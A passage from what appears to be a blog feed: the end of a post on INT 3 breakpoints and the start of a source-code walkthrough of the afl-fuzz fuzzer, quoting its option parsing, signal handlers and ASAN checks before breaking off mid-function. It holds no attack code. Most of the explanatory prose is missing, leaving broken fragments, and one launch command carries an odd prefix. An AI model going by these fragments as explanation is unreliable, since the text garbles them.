Sycrop</a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p> INT3</p><p> INT 3  INT 3  11001100b0xCC</p><p> CPU  INT 3  INT 3 CPU breakpoint exception#BP</p><p> INT 3 INT 3 </p><p> API IRET&#x2F;IRETD  CPU </p><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>x86PSWTrap FlagTF  </p><p>TF1CPU  </p><p></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>afl-fuzz</title>
      <link href="/2024/03/25/afl-fuzz/"/>
      <url>/2024/03/25/afl-fuzz/</url>
      
        <content type="html"><![CDATA[<blockquote><p>FUZZ</p></blockquote><span id="more"></span><p>corpus: fuzzer</p><p>mutation: </p><ul><li>deterministic </li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line">  <span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// getoptafl-fuzz</span></span><br><span class="line">  <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">      <span class="comment">// -i: input dir, corpus </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -o: output dir </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -M: master fuzzer</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//  deterministic </span></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -S: Slave fuzzer</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -f:  -f  afl-fuzz</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -x </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -t: ms</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -m </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// none </span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// </span></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// -b: bind core CPU</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -d  deterministic </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// shm</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  crash exploration </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//  dumb mode</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  banner,theme?</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Qemufuzz</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -V: version</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br><span class="line">$ AFL_AUTO afl-fuzz -m none -i samples/ -o fuzzout/ -M master_fuzzer -- /path/to/exe @@</span><br></pre></td></tr></table></figure><p><code>@@</code> <code>samples</code></p><p>core_patterncore dump</p><h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set up signal handlers. More complicated that needs to be, because libc on</span></span><br><span class="line"><span class="comment">   Solaris doesn&#x27;t resume interrupted reads(), sets SA_RESETHAND when you call</span></span><br><span class="line"><span class="comment">   siginterrupt(), and does other unnecessary things. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line"></span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART;</span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Various ways of saying &quot;stop&quot;. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_stop_sig;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exec timeout notifications. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Window resize */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* SIGUSR1: skip entry */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Things we don&#x27;t care about. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h3><p>ASAN&#x2F;MSAN</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = <span class="built_in">getenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR)))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h3><p> Slave fuzzer<code>-S syncid</code>output dir</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Validate and fix up out_dir and sync_dir when using -S. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* x = sync_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;-S / -M and -n are 